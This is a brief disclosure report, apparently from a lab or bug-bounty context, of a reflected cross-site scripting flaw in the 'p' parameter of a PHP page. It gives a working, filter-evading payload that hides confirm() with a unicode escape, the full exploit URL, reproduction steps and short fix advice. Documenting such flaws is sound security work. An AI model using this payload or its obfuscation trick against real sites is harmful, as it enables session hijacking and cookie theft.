# Reflected Cross-Site Scripting (XSS) via `p` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `p` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="k8xv4p"
http://kzlabs.com/punishment/14.php?p=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="e5qw9n"
p
```

---

## Payload Used

```html id="j7q2mr"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/14.php?p=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text id="m4r1zb"
http://kzlabs.com/punishment/14.php?p=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/78b21bf4-d089-4bb7-b348-b30cec6e37c9" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
